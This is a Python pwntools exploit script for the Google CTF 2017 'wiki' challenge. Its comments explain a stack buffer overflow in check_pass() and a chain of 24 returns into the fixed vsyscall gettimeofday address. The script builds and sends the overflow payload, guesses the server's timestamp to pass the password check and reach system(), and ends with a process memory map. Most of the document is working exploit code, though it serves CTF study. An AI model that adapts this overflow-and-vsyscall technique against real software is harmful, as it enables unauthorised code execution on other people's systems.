#
# Google CTF 2017 pwn wiki
#
# Based on:
# * http://gmiru.com/writeups/gctf-wiki/
# * https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall
#

from pwn import *
import time

#r = process('./challenge', aslr=False)
r = process('./challenge')
#gdb.attach(r, '''
#break *0x555555554c52
#'''
#)

r.send('USER\n')
r.send('zomo\n')
r.send('PASS\n')

#
# [1] check_pass() has a stack-overflow vulnerability. (buf_size < bytes_to_read)
#
# push rbp
# push rbx
# sub rsp,88h <--- buf_size == 88h
# mov rsi,rsp
# mov edx,1000h
# call read_n ; rsi: buf, rdx: bytes to read == 4096
#
# [2] vsyscall address is fixed and sys_gettimeofday returns timeval in rdi 
# (and check_pass() takes rdi as an argument, conveniently. so we can chain them together)
#
# [3] in main(), function pointers pointing check_pass(), read_user_n_load_pass(), and list_files()
# are copied onto stack, so we can reach check_pass() (which is func_ptrs[0], conveniently) 
# after 24 times of calling gettimeofday()
# 
# lea rsi,func_ptrs
# lea rdi,[rsp+28h-20h]
# mov ecx,6
# rep movsd <-- copy func_ptrs onto stack
#
# [3] check_pass() takes rdi as an argument (rdi == loaded password). 
# so check_pass() will try to compare the read buf with timeval after 24 times of gettimeofday().
#
# [4] if we can guess the remote timeval, we can bypass the following check.
# 
# mov rbp,rdi <- the argument is moved to rbp
# ...
# call read_n
# test al,7
# jnz short loc_CA8
# mov rsi, rbp <-- normally, it would be the loaded password from db/{user}, but...
# mov rdi, rsp <-- from stdin
# call str_equ
# test eax,eax
# jz short loc_CAD
# mov rdi, command
# call _system
#

buf_on_stack = 'A'*0x88
pop_rbx = p64(0xdeadbeefdeadbeef)
pop_rbp = p64(0xcafebabecafebabe)
sys_gettimeofday = p64(0xffffffffff600400)

payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  # 24 times of gettimeofday()

r.send(payload + '\n')

r.send(p64(int(time.time())) + '\n')  # guess remote timeval

print r.recv(1024)

'''
Start              End                Perm      Name
0x0000563558851000 0x0000563558853000 r-xp      /home/z/ctfs/wiki/challenge
0x0000563558a52000 0x0000563558a53000 r--p      /home/z/ctfs/wiki/challenge
0x0000563558a53000 0x0000563558a54000 rw-p      /home/z/ctfs/wiki/challenge
0x00007f2b82b45000 0x00007f2b82d05000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f2b82d05000 0x00007f2b82f05000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f2b82f05000 0x00007f2b82f09000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f2b82f09000 0x00007f2b82f0b000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f2b82f0b000 0x00007f2b82f0f000 rw-p      mapped
0x00007f2b82f0f000 0x00007f2b82f35000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f2b83117000 0x00007f2b8311a000 rw-p      mapped
0x00007f2b83132000 0x00007f2b83134000 rw-p      mapped
0x00007f2b83134000 0x00007f2b83135000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f2b83135000 0x00007f2b83136000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f2b83136000 0x00007f2b83137000 rw-p      mapped
0x00007ffd4a337000 0x00007ffd4a358000 rw-p      [stack]
0x00007ffd4a3a1000 0x00007ffd4a3a3000 r--p      [vvar]
0x00007ffd4a3a3000 0x00007ffd4a3a5000 r-xp      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
'''
